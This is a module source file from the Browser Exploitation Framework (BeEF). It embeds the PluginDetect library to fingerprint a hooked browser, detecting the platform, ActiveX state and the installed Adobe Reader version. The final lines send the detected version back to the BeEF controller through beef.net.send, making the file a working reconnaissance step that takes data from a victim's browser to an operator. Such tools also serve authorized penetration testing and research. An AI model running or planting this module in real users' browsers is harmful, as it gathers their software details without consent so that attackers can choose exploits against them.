//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

/*
Based on PluginDetect v0.8.3
www.pinlady.net/PluginDetect/license/
*/

var PluginDetect={version:"0.8.3",name:"PluginDetect",openTag:"<",isDefined:function(b){return typeof b!="undefined"
},isArray:function(b){return(/array/i).test(Object.prototype.toString.call(b))
},isFunc:function(b){return typeof b=="function"
},isString:function(b){return typeof b=="string"
},isNum:function(b){return typeof b=="number"
},isStrNum:function(b){return(typeof b=="string"&&(/\d/).test(b))
},getNumRegx:/[\d][\d\.\_,\-]*/,splitNumRegx:/[\.\_,\-]/g,getNum:function(b,c){var d=this,a=d.isStrNum(b)?(d.isDefined(c)?new RegExp(c):d.getNumRegx).exec(b):null;
return a?a[0]:null
},compareNums:function(h,f,d){var e=this,c,b,a,g=parseInt;
if(e.isStrNum(h)&&e.isStrNum(f)){if(e.isDefined(d)&&d.compareNums){return d.compareNums(h,f)
}c=h.split(e.splitNumRegx);
b=f.split(e.splitNumRegx);
for(a=0;
a<Math.min(c.length,b.length);
a++){if(g(c[a],10)>g(b[a],10)){return 1
}if(g(c[a],10)<g(b[a],10)){return -1
}}}return 0
},formatNum:function(b,c){var d=this,a,e;
if(!d.isStrNum(b)){return null
}if(!d.isNum(c)){c=4
}c--;
e=b.replace(/\s/g,"").split(d.splitNumRegx).concat(["0","0","0","0"]);
for(a=0;
a<4;
a++){if(/^(0+)(.+)$/.test(e[a])){e[a]=RegExp.$2
}if(a>c||!(/\d/).test(e[a])){e[a]="0"
}}return e.slice(0,4).join(",")
},getPROP:function(d,b,a){var c;
try{if(d){a=d[b]
}}catch(c){}return a
},findNavPlugin:function(l,e,c){var j=this,h=new RegExp(l,"i"),d=(!j.isDefined(e)||e)?/\d/:0,k=c?new RegExp(c,"i"):0,a=navigator.plugins,g="",f,b,m;
for(f=0;
f<a.length;
f++){m=a[f].description||g;
b=a[f].name||g;
if((h.test(m)&&(!d||d.test(RegExp.leftContext+RegExp.rightContext)))||(h.test(b)&&(!d||d.test(RegExp.leftContext+RegExp.rightContext)))){if(!k||!(k.test(m)||k.test(b))){return a[f]
}}}return null
},getMimeEnabledPlugin:function(k,m,c){var e=this,f,b=new RegExp(m,"i"),h="",g=c?new RegExp(c,"i"):0,a,l,d,j=e.isString(k)?[k]:k;
for(d=0;
d<j.length;
d++){if((f=e.hasMimeType(j[d]))&&(f=f.enabledPlugin)){l=f.description||h;
a=f.name||h;
if(b.test(l)||b.test(a)){if(!g||!(g.test(l)||g.test(a))){return f
}}}}return 0
},getVersionDelimiter:",",findPlugin:function(d){var c=this,b,d,a={status:-3,plugin:0};
if(c.DOM){c.DOM.initDiv()
}if(!c.isString(d)){
return a
}if(d.length==1){c.getVersionDelimiter=d;
return a
}d=d.toLowerCase().replace(/\s/g,"");
b=c.Plugins[d];
if(!b||!b.getVersion){
return a
}a.plugin=b;
a.status=1;
return a
},getPluginFileVersion:function(f,b){var h=this,e,d,g,a,c=-1;
if(h.OS>2||!f||!f.version||!(e=h.getNum(f.version))){return b
}if(!b){return e
}e=h.formatNum(e);
b=h.formatNum(b);
d=b.split(h.splitNumRegx);
g=e.split(h.splitNumRegx);
for(a=0;
a<d.length;
a++){if(c>-1&&a>c&&d[a]!="0"){return b
}if(g[a]!=d[a]){if(c==-1){c=a
}if(d[a]!="0"){return b
}}}return e
},AXO:window.ActiveXObject,getAXO:function(a){var d=null,c,b=this;
try{d=new b.AXO(a)
}catch(c){};
return d
},INIT:function(){this.init.library(this)
},init:{$:1,hasRun:0,objProperties:function(d,e,b){var a,c={};
if(e&&b){if(e[b[0]]===1&&!d.isArray(e)&&!d.isFunc(e)&&!d.isString(e)&&!d.isNum(e)){for(a=0;
a<b.length;
a=a+2){
e[b[a]]=b[a+1];
c[b[a]]=1
}}for(a in e){if(!c[a]&&e[a]&&e[a][b[0]]===1){this.objProperties(d,e[a],b)
}}}},publicMethods:function(c,f){var g=this,b=g.$,a,d;
if(c&&f){for(a in c){try{if(b.isFunc(c[a])){f[a]=c[a](f)
}}catch(d){}}}},plugin:function(a,c){var d=this,b=d.$;
if(a){d.objProperties(b,a,["$",b,"$$",a]);
if(!b.isDefined(a.getVersionDone)){a.installed=null;
a.version=null;
a.version0=null;
a.getVersionDone=null;
a.pluginName=c
}}},detectIE:function(){var init=this,$=init.$,doc=document,e,x,userAgent=navigator.userAgent||"",progid,progid1,progid2;
$.isIE=eval("/*@cc_on!@*/!1");
$.verIE=$.isIE?((/^(?:.*?[^a-zA-Z])??(?:MSIE|IE)\s*(\d+\.?\d*)/i).test(userAgent)?parseFloat(RegExp.$1,10):7):null;
$.ActiveXEnabled=!1;
$.ActiveXFilteringEnabled=!1;
if($.isIE){try{$.ActiveXFilteringEnabled=window.external.msActiveXFilteringEnabled()
}catch(e){}progid1=["Msxml2.XMLHTTP","Msxml2.DOMDocument","Microsoft.XMLDOM","TDCCtl.TDCCtl","Shell.UIHelper","HtmlDlgSafeHelper.HtmlDlgSafeHelper","Scripting.Dictionary"];
progid2=["WMPlayer.OCX","ShockwaveFlash.ShockwaveFlash","AgControl.AgControl",];
progid=progid1.concat(progid2);
for(x=0;
x<progid.length;
x++){if($.getAXO(progid[x])){$.ActiveXEnabled=!0;
if(!$.dbug){break
}}}if($.ActiveXEnabled&&$.ActiveXFilteringEnabled){for(x=0;
x<progid2.length;
x++){if($.getAXO(progid2[x])){$.ActiveXFilteringEnabled=!1;
break
}}}}},detectNonIE:function(){var e=this,c=this.$,d=navigator,b=c.isIE?"":d.userAgent||"",f=d.vendor||"",a=d.product||"";
c.isGecko=(/Gecko/i).test(a)&&(/Gecko\s*\/\s*\d/i).test(b);
c.verGecko=c.isGecko?c.formatNum((/rv\s*\:\s*([\.\,\d]+)/i).test(b)?RegExp.$1:"0.9"):null;
c.isChrome=(/(Chrome|CriOS)\s*\/\s*(\d[\d\.]*)/i).test(b);
c.verChrome=c.isChrome?c.formatNum(RegExp.$2):null;
c.isSafari=!c.isChrome&&((/Apple/i).test(f)||!f)&&(/Safari\s*\/\s*(\d[\d\.]*)/i).test(b);
c.verSafari=c.isSafari&&(/Version\s*\/\s*(\d[\d\.]*)/i).test(b)?c.formatNum(RegExp.$1):null;
c.isOpera=(/Opera\s*[\/]?\s*(\d+\.?\d*)/i).test(b);
c.verOpera=c.isOpera&&((/Version\s*\/\s*(\d+\.?\d*)/i).test(b)||1)?parseFloat(RegExp.$1,10):null},detectPlatform:function(){var e=this,d=e.$,b,a=navigator.platform||"";
d.OS=100;
if(a){var c=["Win",1,"Mac",2,"Linux",3,"FreeBSD",4,"iPhone",21.1,"iPod",21.2,"iPad",21.3,"Win.*CE",22.1,"Win.*Mobile",22.2,"Pocket\\s*PC",22.3,"",100];
for(b=c.length-2;
b>=0;
b=b-2){if(c[b]&&new RegExp(c[b],"i").test(a)){d.OS=c[b+1];
break
}}}},library:function(c){var e=this,d=document,b,a;
c.init.objProperties(c,c,["$",c]);
for(a in c.Plugins){c.init.plugin(c.Plugins[a],a)
}e.publicMethods(c.PUBLIC,c);

c.win.init();
c.head=d.getElementsByTagName("head")[0]||d.getElementsByTagName("body")[0]||d.body||null;
e.detectPlatform();
e.detectIE();
e.detectNonIE();
c.init.hasRun=1}},ev:{$:1,handler:function(c,b,a){return function(){c(b,a)
}
},fPush:function(b,a){var c=this,d=c.$;
if(d.isArray(a)&&(d.isFunc(b)||(d.isArray(b)&&b.length>0&&d.isFunc(b[0])))){a.push(b)
}},callArray:function(a){var b=this,d=b.$,c;
if(d.isArray(a)){while(a.length){c=a[0];
a.splice(0,1);
b.call(c)
}}},call:function(d){var b=this,c=b.$,a=c.isArray(d)?d.length:-1;
if(a>0&&c.isFunc(d[0])){
d[0](c,a>1?d[1]:0,a>2?d[2]:0,a>3?d[3]:0)
}else{if(c.isFunc(d)){
d(c)
}}}},PUBLIC:{getVersion:function(b){var a=function(h,e,d){var f=b.findPlugin(h),g,c;
if(f.status<0){return null
};
g=f.plugin;
if(g.getVersionDone!=1){g.getVersion(null,e,d);
if(g.getVersionDone===null){g.getVersionDone=1
}}c=(g.version||g.version0);
c=c?c.replace(b.splitNumRegx,b.getVersionDelimiter):c;
return c
};

return a
},hasMimeType:function(b){var a=function(d){if(!b.isIE&&d&&navigator&&navigator.mimeTypes){var g,f,c,e=b.isArray(d)?d:(b.isString(d)?[d]:[]);
for(c=0;
c<e.length;
c++){if(b.isString(e[c])&&/[^\s]/.test(e[c])){g=navigator.mimeTypes[e[c]];
f=g?g.enabledPlugin:0;
if(f&&(f.name||f.description)){return g
}}}}return null
};

return a
},z:0},win:{$:1,loaded:false,hasRun:0,init:function(){var b=this,a=b.$;
if(!b.hasRun){b.hasRun=1;
b.addEvent("load",a.ev.handler(b.runFuncs,a));
b.addEvent("unload",a.ev.handler(b.cleanup,a))
}},addEvent:function(c,b){var e=this,d=e.$,a=window;
if(d.isFunc(b)){if(a.addEventListener){a.addEventListener(c,b,false)
}else{if(a.attachEvent){a.attachEvent("on"+c,b)
}else{a["on"+c]=e.concatFn(b,a["on"+c])
}}}},concatFn:function(d,c){return function(){d();
if(typeof c=="function"){c()
}}
},funcs0:[],funcs:[],cleanup:function(b){if(b){for(var a in b){b[a]=0
}b=0
}},runFuncs:function(a){if(a&&!a.win.loaded){a.win.loaded=true;
a.ev.callArray(a.win.funcs0);
a.ev.callArray(a.win.funcs);
if(a.DOM){a.DOM.onDoneEmptyDiv()
}}},z:0},DOM:{$:1,isEnabled:{$:1,objectTag:function(){var a=this.$;
return a.isIE?a.ActiveXEnabled:1
},objectProperty:function(){var a=this.$;
return a.isIE&&a.verIE>=7?1:0
}},div:null,divID:"plugindetect",divClass:"doNotRemove",divWidth:50,getDiv:function(){var a=this;
return a.div||document.getElementById(a.divID)||null
},isDivPermanent:function(){var b=this,c=b.$,a=b.getDiv();
return a&&c.isString(a.className)&&a.className.toLowerCase().indexOf(b.divClass.toLowerCase())>-1?1:0
},initDiv:function(b){var c=this,d=c.$,a;
if(!c.div){a=c.getDiv();
if(a){c.div=a}else{if(b){c.div=document.createElement("div");
c.div.id=c.divID}}if(c.div){c.setStyle(c.div,c.defaultStyle.concat(["display","block","width",c.divWidth+"px","height",(c.pluginSize+3)+
"px","fontSize",(c.pluginSize+3)+"px","lineHeight",(c.pluginSize+3)+"px"]));
if(!a){c.setStyle(c.div,["position","absolute","right","0px","top","0px"]);
c.insertDivInBody(c.div)
}}}},pluginSize:1,altHTML:"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;",emptyNode:function(c){var b=this,d=b.$,a,f;
if(c&&c.childNodes){for(a=c.childNodes.length-1;
a>=0;
a--){
if(d.isIE){b.setStyle(c.childNodes[a],["display","none"])
}c.removeChild(c.childNodes[a])
}}},LASTfuncs:[],onDoneEmptyDiv:function(){var f=this,g=f.$,b,d,c,a,h;
f.initDiv();
if(!g.win.loaded||g.win.funcs0.length||g.win.funcs.length){return
}for(b in g.Plugins){d=g.Plugins[b];
if(d){if(d.OTF==3||(d.funcs&&d.funcs.length)){return
}}}g.ev.callArray(f.LASTfuncs);
a=f.getDiv();
if(a){if(f.isDivPermanent()){}else{
if(a.childNodes){for(b=a.childNodes.length-1;
b>=0;
b--){c=a.childNodes[b];
f.emptyNode(c)}try{a.innerHTML=""
}catch(h){}}if(a.parentNode){
try{a.parentNode.removeChild(a)
}catch(h){}a=null;
f.div=null
}}}},width:function(){var g=this,e=g.DOM,f=e.$,d=g.span,b,c,a=-1;
b=d&&f.isNum(d.scrollWidth)?d.scrollWidth:a;
c=d&&f.isNum(d.offsetWidth)?d.offsetWidth:a;
return c>0?c:(b>0?b:Math.max(c,b))
},obj:function(b){var d=this,c=d.span,a=c&&c.firstChild?c.firstChild:null;
return a
},readyState:function(){var b=this,a=b.DOM.$;
return a.isIE?a.getPROP(b.obj(),"readyState"):b.undefined
},objectProperty:function(){var d=this,b=d.DOM,c=b.$,a;
if(b.isEnabled.objectProperty()){a=c.getPROP(d.obj(),"object")
}return a
},getTagStatus:function(b,m,r,p,f,h){var s=this,d=s.$,q;
if(!b||!b.span){return -2
}var k=b.width(),c=b.readyState(),a=b.objectProperty();
if(a){return 1.5
}var g=/clsid\s*\:/i,o=r&&g.test(r.outerHTML||"")?r:(p&&g.test(p.outerHTML||"")?p:0),i=r&&!g.test(r.outerHTML||"")?r:(p&&!g.test(p.outerHTML||"")?p:0),
l=b&&g.test(b.outerHTML||"")?o:i;
if(!m||!m.span||!l||!l.span){return 0
}var j=l.width(),n=m.width(),t=l.readyState();
if(k<0||j<0||n<=s.pluginSize){return 0
}if(h&&!b.pi&&d.isDefined(a)&&d.isIE&&b.tagName==l.tagName&&b.time<=l.time&&k===j&&c===0&&t!==0){b.pi=1
}if(j<n){return b.pi?-0.1:0
}if(k>=n){if(!b.winLoaded&&d.win.loaded){return b.pi?-0.5:-1
}if(d.isNum(f)){if(!d.isNum(b.count2)){b.count2=f
}if(f-b.count2>0){return b.pi?-0.5:-1
}}}try{if(k==s.pluginSize&&(!d.isIE||c===4)){if(!b.winLoaded&&d.win.loaded){return 1
}if(b.winLoaded&&d.isNum(f)){if(!d.isNum(b.count)){b.count=f
}if(f-b.count>=5){return 1
}}}}catch(q){}return b.pi?-0.1:0
},setStyle:function(b,h){var c=this,d=c.$,g=b.style,a,f;
if(g&&h){for(a=0;
a<h.length;
a=a+2){try{g[h[a]]=h[a+1]
}catch(f){}}}},insertDivInBody:function(a,h){var j=this,d=j.$,g,b="pd33993399",c=null,i=h?window.top.document:window.document,f=i.getElementsByTagName("body")[0]||i.body;
if(!f){try{i.write('<div id="'+b+'">.'+d.openTag+"/div>");
c=i.getElementById(b)
}catch(g){}}f=i.getElementsByTagName("body")[0]||i.body;
if(f){f.insertBefore(a,f.firstChild);
if(c){f.removeChild(c)
}}},defaultStyle:["verticalAlign","baseline","outlineStyle","none","borderStyle","none","padding","0px","margin","0px","visibility","visible"],insert:function(b,i,g,h,c,q,o)
{var s=this,f=s.$,r,t=document,v,m,p=t.createElement("span"),k,a,l="outline-style:none;border-style:none;padding:0px;margin:0px;visibility:"+
(q?"hidden;":"visible;")+"display:inline;";
if(!f.isDefined(h)){h=""
}if(f.isString(b)&&(/[^\s]/).test(b)){b=b.toLowerCase().replace(/\s/g,"");
v=f.openTag+b+" ";
v+='style="'+l+'" ';
var j=1,u=1;
for(k=0;
k<i.length;
k=k+2){if(/[^\s]/.test(i[k+1])){v+=i[k]+'="'+i[k+1]+'" '
}if((/width/i).test(i[k])){j=0
}if((/height/i).test(i[k])){u=0
}}v+=(j?'width="'+s.pluginSize+'" ':"")+(u?'height="'+s.pluginSize+'" ':"");
v+=">";
for(k=0;
k<g.length;
k=k+2){if(/[^\s]/.test(g[k+1])){v+=f.openTag+'param name="'+g[k]+'" value="'+g[k+1]+'" />'
}}v+=h+f.openTag+"/"+b+">"
}else{b="";
v=h
}if(!o){s.initDiv(1)
}var n=o||s.getDiv();
m={span:null,winLoaded:f.win.loaded,tagName:b,outerHTML:v,DOM:s,time:new Date().getTime(),width:s.width,obj:s.obj,readyState:s.readyState,objectProperty:s.objectProperty};
if(n&&n.parentNode){
s.setStyle(p,s.defaultStyle.concat(["display","inline"]).concat(o?[]:["fontSize",(s.pluginSize+3)+"px","lineHeight",(s.pluginSize+3)+"px"]));
n.appendChild(p);
try{p.innerHTML=v
}catch(r){};
m.span=p;
m.winLoaded=f.win.loaded
}return m
}},Plugins:{adobereader:{$:1,setPluginStatus:function(){var d=this,b=d.$,a=d.navPlugin.detected,e=d.navPlugin.version,
g=d.axo.detected,c=d.axo.version,i=d.doc.detected,h=d.doc.version,f=e||c||h||null;
d.installed=f?1:(a>0||g>0||i>0?0:(i==-0.5?-0.15:(b.isIE&&(!b.ActiveXEnabled||b.ActiveXFilteringEnabled)?-1.5:-1)));
d.version=b.formatNum(f)},getVersion:function(c,e){var a=this,d=a.$,b=0;
if((!b||d.dbug)&&a.navPlugin.query().detected>0){b=1
}if((!b||d.dbug)&&a.axo.query().detected>0){b=1
}if((!b||d.dbug)&&(a.doc.query().detected>0||a.doc.detected==-0.5)){b=1
}a.setPluginStatus()
},navPlugin:{$:1,detected:0,version:null,mimeType:"application/pdf",isDisabled:function(){var c=this,b=c.$,a=c.$$;
return b.isIE||c.detected||!b.hasMimeType(c.mimeType)?1:0
},attempt3:function(){var c=this,b=c.$,a=null;
if(b.OS==1){if(b.hasMimeType("application/vnd.adobe.pdfxml")){a="9"
}else{if(b.hasMimeType("application/vnd.adobe.x-mars")){a="8"
}else{if(b.hasMimeType("application/vnd.adobe.xfdf")){a="6"
}}}}return a
},query:function(){var d=this,c=d.$,a=d.$$,f,e,b=null;
if(d.isDisabled()){return d
};
f="Adobe.*PDF.*Plug-?in|Adobe.*Acrobat.*Plug-?in|Adobe.*Reader.*Plug-?in";
e=c.findNavPlugin(f,0);
d.detected=e?1:-1;
if(e){b=c.getNum(e.description)||c.getNum(e.name);
b=c.getPluginFileVersion(e,b);
if(!b){b=d.attempt3()
}}if(b){d.version=b
};
return d
}},pluginQuery:function(j){var f=this,d=f.$,b="",h=null,g,a,i,c;
try{if(j){b=j.GetVersions()}}catch(g){}if(b&&d.isString(b)){a=/=\s*([\d\.]+)/g;
for(i=0;
i<30;
i++){if(a.test(b)){c=d.formatNum(RegExp.$1);
if(!h||d.compareNums(c>h)>0){h=c
}}else{break
}}}return h
},axo:{$:1,detected:0,version:null,progID:["AcroPDF.PDF","AcroPDF.PDF.1","PDF.PdfCtrl","PDF.PdfCtrl.5","PDF.PdfCtrl.1"],isDisabled:function(){var b=this,c=b.$,a=b.$$;
return c.isIE&&!b.detected?0:1
},query:function(){var d=this,e=d.$,b=d.$$,f=0,c=null,a;
if(d.isDisabled()){return d
};
for(a=0;
a<d.progID.length;
a++){f=e.getAXO(d.progID[a]);
if(f){d.detected=1;
c=b.pluginQuery(f);
if(!e.dbug&&c){break
}}}d.version=c?c:null;
if(d.detected===0){d.detected=-1
};
return d
}},doc:{$:1,detected:0,version:null,classID:"clsid:CA8A9780-280D-11CF-A24D-444553540000",classID_dummy:"clsid:CA8A9780-280D-11CF-A24D-BA9876543210",
DummySpanTagHTML:0,HTML:0,DummyObjTagHTML1:0,DummyObjTagHTML2:0,isDisabled:function(){var c=this,b=c.$,a=0;
if(c.detected){a=1
}else{if(b.dbug){}else{if(!b.isIE||!b.DOM.isEnabled.objectTag()){a=1
}}}return a
},query:function(){var i=this,d=i.$,f=i.$$,h=null,a=d.DOM.altHTML,g=null,c=1,e=1,b;
if(i.isDisabled()){return i
};
if(!i.DummySpanTagHTML){i.DummySpanTagHTML=d.DOM.insert("",[],[],a,f,e)
}if(!i.HTML){i.HTML=d.DOM.insert("object",["classid",i.classID],[],a,f,e)
}if(!i.DummyObjTagHTML2){i.DummyObjTagHTML2=d.DOM.insert("object",["classid",i.classID_dummy],[],a,f,e)
}b=d.DOM.getTagStatus(i.HTML,i.DummySpanTagHTML,i.DummyObjTagHTML1,i.DummyObjTagHTML2,g,c);
h=f.pluginQuery(i.HTML.obj());
i.detected=b>0||h?1:(b==-0.1||b==-0.5?-0.5:-1);
i.version=h?h:null;
return i
}}},zz:0}};
PluginDetect.INIT();

	var result = PluginDetect.getVersion("AdobeReader"); 

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "adobereader="+result);

});

